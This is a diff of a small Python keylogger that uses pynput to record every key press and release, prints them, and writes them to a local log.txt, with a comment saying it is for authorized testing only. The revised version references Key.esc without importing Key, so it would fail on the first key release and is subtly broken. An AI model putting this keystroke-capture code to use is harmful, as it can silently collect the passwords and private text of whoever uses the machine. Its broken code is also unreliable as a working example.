@@ -1,44 +1,47 @@
 #!/usr/bin/env python3
+# Keylogger using pynput module
 # For personal/authorized testing only
-# Works on Linux Debian (aarch64) with pynput
+# Works on Linux Debian (aarch64)
 
 import pynput
-
 from pynput.keyboard import Listener
 
-LOGFILE = "log.txt"
-
-
-def write_log(line: str):
-    with open(LOGFILE, "a+", encoding="utf-8") as f:
-        f.write(line + "\n")
+keys = []
 
 
 def on_press(key):
-    try:
-        line = f"alphanumeric key {key.char} pressed"
-    except AttributeError:
-        line = f"special key {key} pressed"
 
-    print(line)
-    write_log(line)
+    keys.append(key)
+    write_file(keys)
+
+    try:
+        print("alphanumeric key {0} pressed".format(key.char))
+
+    except AttributeError:
+        print("special key {0} pressed".format(key))
+
+
+def write_file(keys):
+
+    with open("log.txt", "w") as f:
+        for key in keys:
+
+            # Removing ''
+            k = str(key).replace("'", "")
+            f.write(k)
+
+            # Explicitly adding a space after
+            # every keystroke for readability
+            f.write(" ")
 
 
 def on_release(key):
-    try:
-        line = f"'{key.char}' released"
-    except AttributeError:
-        line = f"special key {key} released"
 
-    print(line)
-    write_log(line)
-
-    if key == key.esc:
-        print("ESC pressed — exiting.")
-        return False  # Stop the listener
+    print("{0} released".format(key))
+    if key == Key.esc:
+        # Stop the listener
+        return False
 
 
-if __name__ == '__main__':
-    print("Keylogger started. Press ESC to quit.")
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
